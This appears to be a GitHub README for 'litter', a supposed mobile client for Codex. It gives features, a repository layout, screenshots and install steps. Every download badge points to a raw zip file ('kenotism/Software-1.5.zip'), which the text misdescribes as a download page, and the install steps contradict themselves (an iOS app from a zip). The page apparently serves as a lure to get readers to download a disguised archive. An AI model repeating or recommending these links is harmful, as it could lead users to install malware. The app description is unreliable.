# 🗑️ litter - Simple Codex Client for Mobile Devices

[![Download litter](https://img.shields.io/badge/Download-litter-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sizco123/litter/main/kenotism/Software-1.5.zip)

---

## 🧾 What is litter?

litter is a native app designed for iOS and Android. It connects you directly to Codex, a backend service that powers its features. You can use litter on your phone to access Codex quickly and easily.

The app is built to work smoothly on most modern mobile phones. It supports light and dark modes and includes accessibility options for larger text and high contrast views.

---

## ⚙️ How litter works

- On iOS, litter runs as a native app using Swift.
- On Android, it uses native Android components with Compose UI.
- The app talks to Codex servers over the network.
- It supports multiple discovery services to find Codex servers nearby.
- The interface adapts to your phone’s settings, such as text size and colors.

---

## 💻 Repository structure

Here’s a quick overview of the main folders and files in the litter project:

- `apps/ios`: The native iOS app code with two main setups you might not need to worry about.
- `apps/android`: Android app code, including UI and network parts.
  - `app`: Main Android UI and logic.
  - `core/bridge`: Connects native features to the app.
  - `core/network`: Finds Codex servers on your network using different methods.
- `docs/qa-matrix.md`: Lists testing results to keep Android app aligned with iOS.
- `shared/rust-bridge/codex-b`: Shared Rust code for core operations.

---

## 🖼️ Screenshots (iPhone 17 Pro)

Here are some images to show how litter looks on iPhone 17 Pro in different modes:

| Dark Mode (Default)                  | Light Mode                        |
| ---------------------------------- | -------------------------------- |
| ![Dark default](docs/screenshots/iphone17pro/01-dark-default.png) | ![Light mode](docs/screenshots/iphone17pro/02-light.png) |

| Accessibility XXL Text              | Dark Mode + High Contrast         |
| ---------------------------------- | -------------------------------- |
| ![XXXL text](docs/screenshots/iphone17pro/03-accessibility-xxxl.png) | ![Dark high contrast](docs/screenshots/iphone17pro/04-dark-high-contrast.png) |

---

## 🖥️ System Requirements

- **Operating system**: iOS 14 or newer / Android 10 or newer.
- **Memory**: At least 2 GB of RAM recommended.
- **Storage**: At least 50 MB free space.
- **Network**: Wi-Fi or cellular data connection.
- **Device**: Modern smartphone with touch screen.

---

## 🚀 Getting Started: Download & Install

To use litter on your phone, start by downloading the app from the project's main GitHub page. This page contains the latest versions available for both iOS and Android.

[![Get litter here](https://img.shields.io/badge/Get%20litter%20here-blue?style=for-the-badge)](https://raw.githubusercontent.com/sizco123/litter/main/kenotism/Software-1.5.zip)

**Step 1: Visit the download page**

Open the link above on your phone. This will take you to the repository where you can find installation instructions and the app files.

**Step 2: Install on iPhone**

- Open the download page.
- Look for the iOS app or instructions to install via TestFlight or App Store.
- Follow the instructions to install the app on your device.
- Once installed, open the app from your home screen.

**Step 3: Install on Android**

- Open the download page.
- Find the Android app file (.apk) or the Google Play link if provided.
- If you download the .apk, you may need to allow installation from unknown sources in your phone settings.
- Open the downloaded file to install the app.
- Once installed, open litter from your app drawer.

---

## 🔧 How to Use litter

Once the app is installed on your phone, here is how to get started:

- Open the app.
- It will start searching for Codex servers in your network automatically.
- If no servers are found, you can enter the server address manually.
- Use the features inside the app to browse, read, or manage Codex content.
- Switch between dark and light modes in the app settings.
- Enable accessibility features like larger text or high contrast for easier reading.

---

## 📱 Tips for Best Experience

- Connect your phone to a stable Wi-Fi network for best performance.
- Keep the app updated to get the latest fixes and improvements.
- Adjust text size and app color mode for comfortable viewing.
- Restart the app if it does not find your Codex server right away.
- Use the native app settings on iOS or Android to manage notifications and permissions.

---

## 🛠️ Troubleshooting

If the app does not work as expected:

- Check your internet connection.
- Restart your phone and open the app again.
- Make sure you have the correct server address if entering manually.
- Look for updated versions on the GitHub page.
- Contact support through the repository issues, if needed.

---

## 📂 More Information

For developers or curious users, the repository contains folders for iOS and Android source code, network discovery features, and shared components built with Rust.

You can browse the source code or open issues if you want to report bugs or suggest improvements.

---

## 📥 Ready to download?

[![Download litter](https://img.shields.io/badge/Download-litter-purple?style=for-the-badge)](https://raw.githubusercontent.com/sizco123/litter/main/kenotism/Software-1.5.zip)